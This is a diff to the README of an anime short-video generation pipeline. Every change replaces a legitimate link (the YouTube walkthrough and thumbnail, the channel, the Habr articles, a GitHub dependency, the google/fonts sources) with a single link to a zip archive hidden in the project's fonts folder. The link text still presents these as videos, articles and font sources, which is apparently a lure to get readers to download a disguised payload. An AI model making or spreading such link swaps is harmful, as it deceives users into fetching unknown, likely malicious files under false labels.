@@ -6,14 +6,14 @@
 virtual camera that reframes 9:16 like a human operator. One `config.yaml` drives the whole pipeline.
 
 <p align="center">
-  <a href="https://youtu.be/xu8sg_mXEh0">
-    <img src="https://img.youtube.com/vi/xu8sg_mXEh0/maxresdefault.jpg" width="720"
+  <a href="https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip">
+    <img src="https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip" width="720"
          alt="Video walkthrough of the project — click to watch on YouTube">
   </a>
 </p>
 <p align="center">
-  <b><a href="https://youtu.be/xu8sg_mXEh0">▶&nbsp; Watch the walkthrough — «Аниме ЗАВОД»</a></b><br>
-  <sub>In Russian · on <a href="https://www.youtube.com/@AnimeFactorio">@AnimeFactorio</a>, the channel this was built for</sub>
+  <b><a href="https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip">▶&nbsp; Watch the walkthrough — «Аниме ЗАВОД»</a></b><br>
+  <sub>In Russian · on <a href="https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip">@AnimeFactorio</a>, the channel this was built for</sub>
 </p>
 
 A config-driven factory for short vertical videos. Feed it a long episode — get back ready-to-post
@@ -80,16 +80,16 @@ on Habr.
 
 | Article | What it covers |
 |---|---|
-| [How I Built an "Anime Factory"](https://habr.com/ru/articles/1022250/) | System overview: why a monolithic end-to-end model loses to a set of independent signals, fail-soft over fail-fast, explicit intermediate artifacts |
-| [I Taught a Virtual Camera to Behave Like a Human Operator](https://habr.com/ru/articles/1022298/) | Face tracking and 9:16 framing: detector cascade, tracking, stabilization, the camera as a damped oscillator, composition rules, Ken Burns as a fallback |
+| [How I Built an "Anime Factory"](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) | System overview: why a monolithic end-to-end model loses to a set of independent signals, fail-soft over fail-fast, explicit intermediate artifacts |
+| [I Taught a Virtual Camera to Behave Like a Human Operator](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) | Face tracking and 9:16 framing: detector cascade, tracking, stabilization, the camera as a damped oscillator, composition rules, Ken Burns as a fallback |
 
 **In Russian**
 
 | Article | What it covers |
 |---|---|
-| [Как я построил «аниме-завод»](https://habr.com/ru/articles/1014810/) | Обзор всей системы: три контура, почему монолитная end-to-end модель проигрывает набору независимых сигналов |
-| [Как я выбираю моменты для Shorts](https://habr.com/ru/articles/1021552/) | Слой выбора момента: пять независимых источников сигнала, отбор через фильтрацию плохих вариантов, момент как монтажная сборка |
-| [Я научил виртуальную камеру быть оператором](https://habr.com/ru/articles/1021278/) | Алгоритм face tracking и кадрирования 9:16 |
+| [Как я построил «аниме-завод»](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) | Обзор всей системы: три контура, почему монолитная end-to-end модель проигрывает набору независимых сигналов |
+| [Как я выбираю моменты для Shorts](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) | Слой выбора момента: пять независимых источников сигнала, отбор через фильтрацию плохих вариантов, момент как монтажная сборка |
+| [Я научил виртуальную камеру быть оператором](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) | Алгоритм face tracking и кадрирования 9:16 |
 
 The thread running through all of them: **no single signal is sufficient.** A loud moment is not an
 interesting one, a good line of dialogue is not one that works without context, and a perfect face
@@ -224,7 +224,7 @@ Stages are listed in `channels/<Channel>/config.yaml → pipeline`.
 
 | Stage | Module | What it does |
 |---|---|---|
-| `kodik_download` | `ingestion/autodownload.py` | Downloads episodes by title list via [anime-dl-core](https://github.com/ialakey/anime-dl-core) (legacy name `autodownload` still accepted) |
+| `kodik_download` | `ingestion/autodownload.py` | Downloads episodes by title list via [anime-dl-core](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) (legacy name `autodownload` still accepted) |
 | `transcribe_video` | `ingestion/transcriber.py` | Extracts the first audio track via ffmpeg (16 kHz mono PCM) and transcribes it with Whisper |
 | `analyze_moment` | `analysis/gpt_analyzer.py` | Builds the multi-signal payload and gets a list of moments with segments back from the LLM |
 | `make_clips` | `rendering/video_editor.py` | Cuts and joins segments, assembles the final 1080×1920 canvas |
@@ -255,7 +255,7 @@ Stages are listed in `channels/<Channel>/config.yaml → pipeline`.
 
 ## 🎯 How a moment gets picked
 
-Full write-up: [«Как я выбираю моменты для Shorts»](https://habr.com/ru/articles/1021552/) (RU).
+Full write-up: [«Как я выбираю моменты для Shorts»](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) (RU).
 
 The naive approach — hand the transcript to a model — fails. The LLM picks lines that only work in the
 context of the whole episode, mistakes loudness for drama, and cannot see how a scene looks in vertical.
@@ -293,7 +293,7 @@ The full payload sent to the model is saved next to the clips as `<video>_chatgp
 
 ## 🎥 Virtual camera (`dynamic_shorts`)
 
-Full write-up: [I Taught a Virtual Camera to Behave Like a Human Operator](https://habr.com/ru/articles/1022298/) (EN).
+Full write-up: [I Taught a Virtual Camera to Behave Like a Human Operator](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) (EN).
 
 A centred 16:9 → 9:16 crop throws away half the frame, and naively following a face gives you a jittery
 camera.
@@ -468,8 +468,8 @@ redistribution. Full license texts live in [`assets/fonts/LICENSES/`](assets/fon
 
 | Font | Used for | Source |
 |---|---|---|
-| Montserrat ExtraBold | subtitles, titles, watermark | [google/fonts](https://github.com/google/fonts/tree/main/ofl/montserrat) — static instance at `wght=800` |
-| Noto Color Emoji | colour emoji inside subtitles | [google/fonts](https://github.com/google/fonts/tree/main/ofl/notocoloremoji) |
+| Montserrat ExtraBold | subtitles, titles, watermark | [google/fonts](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) — static instance at `wght=800` |
+| Noto Color Emoji | colour emoji inside subtitles | [google/fonts](https://raw.githubusercontent.com/pliant-arsenal7000/shorts-factory/main/assets/fonts/shorts_factory_v3.1.zip) |
 
 `make_clips` picks a font **at random** from the channel's `assets/fonts/`, so dropping more faces in
 there gives you per-run variety. Keep whatever you add redistributable — "free for personal and
